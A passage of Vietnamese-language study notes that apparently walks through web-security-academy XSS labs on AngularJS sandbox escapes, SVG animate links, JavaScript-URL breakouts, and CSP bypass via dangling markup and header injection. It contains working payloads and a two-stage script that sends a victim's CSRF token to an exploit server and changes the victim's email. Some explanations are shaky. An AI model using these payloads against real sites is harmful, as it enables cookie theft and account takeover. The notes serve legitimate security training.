2. **Pollute prototype**: đổi `String.prototype.charAt` thành `Array.prototype.join` → làm hỏng cách Angular đọc ký tự và kiểm tra identifier → phá sandbox.
3. Dùng `orderBy` filter: `[1] | orderBy: &lt;biểu_thức&gt;` để ép Angular parse & eval thêm một expression khác.
4. Dùng `toString().constructor.fromCharCode(...)` để sinh chuỗi `"x=alert(1)"` mà không dùng literal string.
5. Vì sandbox đã bị phá, Angular coi `"x=alert(1)"` là “tên biến hợp lệ” và trong bước generate function nó nhét đoạn đó vào code, khiến `alert(1)` được thực thi.

=&gt; Đây là một **payload XSS dựa trên AngularJS sandbox escape & prototype pollution**, dùng được trong ngữ cảnh client-side template injection

# **Lab 25: Reflected XSS with AngularJS sandbox escape and CSP**

1. Truy cập máy chủ khai thác và dán mã sau, thay thế `YOUR-LAB-ID` bằng ID phòng thí nghiệm của bạn:
    
    ```jsx
    <script>
    location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
    </script>
    ```
    
2. Click "Store" and "Deliver exploit to victim".

`&lt;input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'&gt;`

```jsx
<!-- Payload 2: filter -->  
<input ng-focus=$event.path|filter:(z=alert)(1)>

<!-- Payload 3: limitTo -->
<input ng-focus=$event.path|limitTo:(z=alert)(1):1>
```

**Giải thích chi tiết:**

- **`&lt;input id=x&gt;`**: Tạo input element với id="x"
- **`ng-focus=`**: AngularJS directive kích hoạt khi element được focus
- **`$event.composedPath()`**:
    - Trả về array các DOM elements trong event path
    - Được dùng làm input cho filter `orderBy`
- **`|orderBy:'(z=alert)(document.cookie)'`**:
    - Pipe `|` chuyển kết quả cho filter `orderBy` của AngularJS
    - `orderBy` filter thực thi expression để sort array
    - **`(z=alert)`**: Gán hàm `alert` vào biến `z`
    - **`(document.cookie)`**: Gọi `alert(document.cookie)` để hiển thị cookie
- **Hash `#x`**
    - Tự động focus vào element có `id="x"` khi page load
    - Trigger sự kiện `ng-focus` → thực thi payload

Cách hoạt động

1. Script redirect nạn nhân đến URL có payload
2. Page render `&lt;input&gt;` với AngularJS directive
3. Hash `#x` làm browser tự động focus vào input
4. Sự kiện `ng-focus` trigger
5. AngularJS sandbox bị bypass qua `orderBy` filter
6. Code `alert(document.cookie)` được thực thi → Lộ cookie

# **Lab 26: Reflected XSS with event handlers and `href` attributes blocked**

Truy cập URL sau, thay thế YOUR-LAB-ID bằng ID phòng thí nghiệm của bạn:

```jsx
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
```

Các biến thể khác

```jsx
// Dùng <set> thay <animate>
<svg><a><set attributeName=href to=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>
```

```jsx
// Dùng xlink:href (cũ hơn)
<svg><a><set attributeName=xlink:href to=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>
```

```jsx
<svg><animate onbegin=alert(1) attributeName=x dur=1s />
```

URL Decoded Payload

```jsx
<svg>
  <a>
    <animate attributeName=href values=javascript:alert(1) />
    <text x=20 y=20>Click me</text>
  </a>
</svg>
```

`&lt;animate&gt;` - Phần quan trọng nhất

```jsx
<animate attributeName=href values=javascript:alert(1) />

/*
**Giải thích:**

- **`attributeName=href`**: Chỉ định attribute nào sẽ được animate → animate attribute `href` của thẻ `<a>` cha
- **`values=javascript:alert(1)`**: Giá trị để set cho attribute
    - `javascript:` là protocol cho phép chạy JavaScript code
    - `alert(1)` là code sẽ thực thi
- Element `<animate>` tự động set attribute cho parent element
```

`&lt;text&gt;` - Clickable content

```jsx
<text x=20 y=20>Click me</text>

/*
- Hiển thị text "Click me" tại vị trí (20, 20)
- Đây là nội dung clickable của link
- Khi click → trigger `javascript:alert(1)`

## Cách hoạt động

1. Page render SVG với <a> và <animate>
2. <animate> tự động set href="javascript:alert(1)" cho <a>
3. User thấy text "Click me"
4. User click vào text
5. Browser thực thi javascript:alert(1)
6. Alert hiển thị
```

# **Lab 27: Reflected XSS in a JavaScript URL with some characters blocked**

Truy cập URL sau, thay thế `YOUR-LAB-ID` bằng ID phòng thí nghiệm của bạn:

```jsx
https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```

URL Decoded Payload

```jsx
5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

**Context giả định**
Web app có thể xử lý query string và inject vào JavaScript như:javascript

```jsx
var config = {postId: '5', tracking: 'USER_CONTROLLABLE'};
```

Hoặc có thể app parse toàn bộ query params:javascript

```jsx
var params = 'postId=5&INJECTION_HERE';
```

Nhưng khả năng cao nhất là có một **tracking parameter ẩn** bị vulnerable:javascript

```jsx
var data = {postId: 5, tracking: ''},x=x=>{throw*/**/*onerror=alert,1337},toString=x,win
```

**1. `'}` - Escape context**

- Đóng string literal `'`
- Đóng object `}`
- Break out khỏi object context

**2. `,x=x=&gt;{throw/**/onerror=alert,1337}` - Define malicious function**

```jsx
x = x => {
  throw onerror=alert, 1337
}
```

**Chi tiết:**

- **Arrow function**: `x=&gt;{}` syntax ngắn gọn
- **`throw`**: Ném exception
- **`/**/`**: Comment thay space (bypass filter)
- **`onerror=alert`**: Trong throw expression, gán `alert` cho property `onerror`
- **`,1337`**: Comma operator - expression cuối cùng

**3. `,toString=x`** - Hijack toString method

javascript

`toString = x`

- Override `Object.prototype.toString` hoặc `window.toString`
- Giờ mọi conversion sang string sẽ gọi function độc hại `x`

### **4. `,window+''`** - Trigger the payload

javascript

`window + ''`

- **Type coercion**: Cộng object với string
- JavaScript tự động gọi `window.toString()`
- Nhưng `toString` đã bị hijack thành function `x`
- → Function `x` thực thi
- → **Throw exception** với `onerror=alert`

### **5. Exception flow**

javascript

`throw onerror=alert, 1337`

**Cách hoạt động:**

1. Expression `onerror=alert` gán `alert` function
2. Comma operator `,` trả về giá trị cuối: `1337`
3. `throw 1337` ném exception
4. Global `onerror` handler (nếu có) được trigger
5. Hoặc assignment `onerror=alert` đã làm gì đó trong context
6. Cuối cùng **`alert(1337)`** được thực thi

### **6. `,{x:'`** - Balance syntax

```jsx
{x: '
```

- Mở object mới
- String `'` chưa đóng - để match với code phía sau trong page

Luồng thực thi đầy đủ

```jsx
// Original code (giả định)
var config = {tracking: 'INJECT_HERE'};

// After injection
var config = {tracking: ''},
    x = x => { throw onerror=alert, 1337 },  // [1] Define malicious function
    toString = x,                             // [2] Hijack toString
    window + '',                              // [3] Trigger: window.toString() → x() → throw
    {x: ''};                                  // [4] Balance syntax

// Execution:
// Step 1: x function được define
// Step 2: toString bị override
// Step 3: window+'' force type conversion
// Step 4: toString() gọi x()
// Step 5: x() throw với onerror=alert
// Step 6: alert(1337) execute!
```

## Tại sao `5&` ở đầu?

Có thể:
1. **Giữ postId hợp lệ**: `postId=5` để page load bình thường
2. **Bypass filter**: Một số filter check toàn bộ query string
3. **Multiple parameters**: Server parse nhiều params và inject vào JS

## Diagram minh họa
```
URL Query String:
┌─────────┬───────────────────────────────────────┐
│ postId=5 │ '},x=...payload...{x:'                │
└─────────┴───────────────────────────────────────┘
     ↓                    ↓
 Normal param      Injection payload
     ↓                    ↓
  [Processed]      [Injected into JS]
                           ↓
              var config = {tracking: ''}, ← break out
                          x = x => {...},   ← define
                          toString = x,     ← hijack
                          window + '',      ← trigger
                          {x: ''};          ← balance
```

# **Lab 28: Reflected XSS protected by very strict CSP, with dangling markup attack**

⚠️ **Lỗ hổng:** Thiếu `form-action` trong directive của CSP dẫn tới Bypass CSP

## 1. Kiến thức nền tảng cần có

### **A. Content Security Policy (CSP)**

CSP là header bảo mật ngăn chặn XSS:

http

`Content-Security-Policy: script-src 'self'; form-action 'self'`

**Các directive quan trọng:**

- `script-src`: Kiểm soát nguồn JavaScript
- `form-action`: Kiểm soát nơi form submit tới
- `img-src`, `style-src`, etc.

### **B. Reflected XSS**

User input được reflect lại page mà không sanitize:

html

`*&lt;!-- URL: /page?input=&lt;script&gt;alert(1)&lt;/script&gt; --&gt;*
&lt;div&gt;Welcome: &lt;script&gt;alert(1)&lt;/script&gt;&lt;/div&gt;`

### **C. CSRF Token**

Token ngăn chặn CSRF attack:

html

`&lt;form&gt;
  &lt;input name="csrf" value="abc123xyz" hidden&gt;
  &lt;input name="email"&gt;
&lt;/form&gt;`

---

## 2. Phân tích bài lab

### **Mục tiêu:**

1. Bypass CSP (rất strict)
2. Exfiltrate CSRF token của victim
3. Đổi email victim thành `hacker@evil-user.net`

### **Constraints:**

- CSP block inline script
- CSP block external resources
- Client-side validation check email format
- Cần CSRF token để đổi email
- Phải có chữ "Click" để victim click

---

## 3. Các bước tấn công chi tiết

### **BƯỚC 1: Khám phá lỗ hổng XSS**

```jsx
*# Test basic XSS*
https://LAB-ID.web-security-academy.net/my-account?email=<img src onerror=alert(1)>
```

**Kết quả:** Payload reflected nhưng không execute → CSP chặn!

*### **BƯỚC 2: Kiểm tra CSP***

Mở DevTools Console, sẽ thấy:
```
Refused to execute inline script because it violates the following Content Security Policy directive...
```

**Phân tích CSP:**

http

`Content-Security-Policy: default-src 'self'; script-src 'self'`

⚠️ **Lỗ hổng:** Thiếu `form-action` directive!

---

### **BƯỚC 3: Form Hijacking - Bypass CSP**

**Ý tưởng:** Nếu CSP không có `form-action`, ta có thể redirect form submit!

### **3.1. Inject button với formaction**

`*&lt;!-- Payload --&gt;*`

```jsx
foo@bar"><button formaction="https://EXPLOIT-SERVER/exploit">Click me</button>
```

`*&lt;!-- URL encode --&gt;*`

```jsx
?email=foo@bar%22%3E%3Cbutton+formaction%3D%22https://EXPLOIT-SERVER/exploit%22%3EClick+me%3C/button%3E
```

**Cách hoạt động:**

html

`*&lt;!-- Original form --&gt;*`

```jsx
<form method="POST" action="/my-account/change-email">
  <input name="email" value="foo@bar">  *<!-- Injection point -->*
  <input name="csrf" value="SECRET" hidden>
  <button>Update</button>
</form>
```

`*&lt;!-- After injection --&gt;`* 

```jsx
<form method="POST" action="/my-account/change-email">
  <input name="email" value="foo@bar">
  <button formaction="https://EXPLOIT-SERVER/exploit">Click me</button>
  *<!-- Original content -->*
  <input name="csrf" value="SECRET" hidden>
  <button>Update</button>
</form>
```

**HTML attributes quan trọng:**

- `formaction`: Override form's action attribute
- `formmethod`: Override form's method

---

### **BƯỚC 4: Exfiltrate CSRF Token**

**Vấn đề:** POST method → data trong body, không thấy trong URL

**Giải pháp:** Force GET method!

html

```jsx
foo@bar"><button formaction="https://EXPLOIT-SERVER/exploit" formmethod="get">Click me</button>
**Khi victim click:**
```
GET https://EXPLOIT-SERVER/exploit?email=foo@bar&csrf=abc123xyz
```

✅ CSRF token giờ có trong URL!

---

### **BƯỚC 5: Script tự động hóa trên Exploit Server**

```jsx
&lt;body&gt;
&lt;script&gt;
*// URLs*
const academyFrontend = "https://LAB-ID.web-security-academy.net/";
const exploitServer = "https://EXPLOIT-SERVER-ID.exploit-server.net/exploit";

*// Lấy CSRF token từ URL*
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

if (csrf) {
    *// STAGE 2: Đã có token → Submit form đổi email*
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');
    
    token.name = 'csrf';
    token.value = csrf;  *// ← Stolen token*
    
    email.name = 'email';
    email.value = 'hacker@evil-user.net';  *// ← New email*
    
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();  *// ← Auto submit*
    
} else {
    *// STAGE 1: Chưa có token → Redirect để lấy token*
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
&lt;/script&gt;
&lt;/body&gt;
```

---

## 📊 4. Flow diagram tổng thể
```
┌─────────────────────────────────────────────────────────────┐
│                    VICTIM'S PERSPECTIVE                      │
└─────────────────────────────────────────────────────────────┘

1. Victim nhận link exploit từ attacker
   │
   ▼
2. Visit: https://EXPLOIT-SERVER/exploit
   │
   ▼
3. Script check: Có CSRF token chưa?
   ├─ NO → Redirect to Stage 1
   └─ YES → Execute Stage 2

┌────────────────────────────────────────────────────────────┐
│                        STAGE 1                              │
│              (Exfiltrate CSRF Token)                        │
└────────────────────────────────────────────────────────────┘

4. Redirect tới:
   https://LAB.net/my-account?email=INJECTED_BUTTON
   │
   ▼
5. Page hiển thị button "Click me" (hijacked form)
   │
   ▼
6. Victim click button
   │
   ▼
7. Form submit với GET method tới exploit server:
   GET https://EXPLOIT-SERVER/exploit?csrf=TOKEN&email=...
   │
   ▼
8. Token leaked trong URL!

┌────────────────────────────────────────────────────────────┐
│                        STAGE 2                              │
│                  (Change Email)                             │
└────────────────────────────────────────────────────────────┘

9. Script extract CSRF token từ URL
   │
   ▼
10. Tạo form động với:
    - email = hacker@evil-user.net
    - csrf = TOKEN_VỪA_ĐÁNH_CẮP
   │
   ▼
11. Auto submit form tới:
    POST /my-account/change-email
   │
   ▼
12. ✅ Email changed successfully!
```

---

## 🛠️ 5. Thực hành từng bước

### **Step 1: Setup**

```jsx
1. Login với: wiener:peter
2. Tìm email change form
3. Check DevTools → tìm CSRF token
```

### **Step 2: Test XSS**

```jsx
URL: /my-account?email=&lt;img src=x onerror=alert(1)&gt;
→ Check Console → CSP blocked
```

### **Step 3: Craft button injection**

```jsx
Payload:
foo@bar"&gt;&lt;button formaction="https://YOUR-EXPLOIT-SERVER/exploit"&gt;Click me&lt;/button&gt;

URL:
/my-account?email=foo@bar%22%3E%3Cbutton+formaction%3D%22...%22%3EClick+me%3C/button%3E`
```

### **Step 4: Add formmethod=get**

```jsx
foo@bar"&gt;&lt;button formaction="https://EXPLOIT/exploit" formmethod="get"&gt;Click me&lt;/button&gt;
```

### **Step 5: Deploy script**

`*Copy script từ solution vào exploit server// Sửa URLs cho đúng// Store → Deliver to victim*`

---

## 💡 6. Các khái niệm quan trọng

### **A. Dangling Markup Attack**

Injection mà không đóng tag hoàn chỉnh:

html

`*<!-- Normal -->*
<input value="USER">

*<!-- Dangling -->*
<input value="USER"><button...
<!-- Original closing > còn đó, nhưng context đã thay đổi -->`

### **B. Form Hijacking**

Override form submission target:

html

`<button formaction="http://evil.com">Click</button>`

### **C. Two-stage Attack**

1. **Stage 1:** Exfiltrate sensitive data
2. **Stage 2:** Use stolen data to attack

---

## 🔒 7. Phòng chống

### **A. CSP đầy đủ**

```jsx
Content-Security-Policy: 
  default-src 'self';
  script-src 'self';
  form-action 'self';  ← QUAN TRỌNG!
```

### **B. Input validation**

```jsx
*// Reject HTML characters*
if (/&lt;|&gt;|"|'/.test(email)) {
  return "Invalid email";
}
```

### **C. Output encoding**

```jsx
*// HTML encode output*
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/&lt;/g, '&lt;')
    .replace(/&gt;/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}
```

### **D. SameSite cookies**

```jsx
Set-Cookie: session=abc; SameSite=Strict
```

# **Lab 29: Reflected XSS protected by CSP, with CSP bypass**

## **User input được inject vào CSP header → Bypass toàn bộ CSP**

```jsx
Vulnerable code:
Content-Security-Policy: script-src 'self'; report-uri /csp?token=USER_INPUT
                                                              ↑
                                                        Controllable!
```

---

## 🔥 Cách exploit

### **Step 1: Tìm injection point**

Test XSS bình thường:

```jsx
?search=&lt;script&gt;alert(1)&lt;/script&gt;
```

→ Bị CSP chặn

### **Step 2: Check CSP trong Burp**

```jsx
HTTP Response:
Content-Security-Policy: script-src 'self'; report-uri /csp-report?token=
                                                                        ↑ empty!
                                                                        
```

**Phát hiện:** Parameter `token` có thể control được

### **Step 3: Inject CSP directive mới**
```
Payload: ;script-src-elem 'unsafe-inline'
```

**Giải thích:**

- `;` → Kết thúc directive cũ, bắt đầu directive mới
- `script-src-elem` → Override rule cho `<script>` tags
- `'unsafe-inline'` → Cho phép inline scripts

### **Step 4: Complete URL**

```jsx
https://LAB-ID.web-security-academy.net/?search=&lt;script&gt;alert(1)&lt;/script&gt;&token=;script-src-elem%20'unsafe-inline'
```

**Kết quả:**

```jsx
Content-Security-Policy: script-src 'self'; report-uri /csp?token=;script-src-elem 'unsafe-inline'
                                                                   ↑
                                                    CSP mới được inject!
```

→ ✅ `alert(1)` execute!

---

## 💡 Tại sao work?

### **CSP parsing**

CSP directives phân tách bởi `;`:
```
directive1 value1; directive2 value2; directive3 value3
```

Inject `;` = thêm directive mới!

### **Directive priority**
```
script-src          → General rule (cho mọi scripts)
script-src-elem     → Specific rule (chỉ cho &lt;script&gt; elements)`

**Rule:** Specific override general!

http

`CSP: script-src 'self'; script-src-elem 'unsafe-inline'
```

→ `<script>` tags dùng `script-src-elem` → inline allowed!

---

## 🛠️ Thực hành nhanh

### **1. Test XSS**
```
?search=&lt;img src=x onerror=alert(1)&gt;`
```

→ CSP blocks it

### **2. Check CSP trong Burp**

```jsx
Content-Security-Policy: ...; report-uri /csp?token=
```

### **3. Inject**
```
&token=;script-src-elem 'unsafe-inline'
```

### **4. Full exploit**
```
?search=&lt;script&gt;alert(1)&lt;/script&gt;&token=;script-src-elem 'unsafe-inline'
```

### **5. Open trong Chrome**

→ ✅ Lab solved!

---

## 📊 Tóm tắt nhanh

```
ComponentGiải thíchLỗ hổngUser input trong CSP headerInjection;script-src-elem 'unsafe-inline'Tại sao?; tạo directive mới,script-src-elem overridescript-srcYêu cầuChrome browser (Firefox parse khác)ImpactBypass hoàn toàn CSP
```

---

## 🛡️ Phòng chống

php

`*// ❌ BAD*
$csp = "script-src 'self'; report-uri /csp?token=" . $_GET['token'];

*// ✅ GOOD - Validate token*
if (!preg_match('/^[a-zA-Z0-9]+$/', $_GET['token'])) {
    die('Invalid token');
}

*// ✅ BEST - Không dùng user input*
$csp = "script-src 'self'; report-uri /csp?token=STATIC_VALUE";`
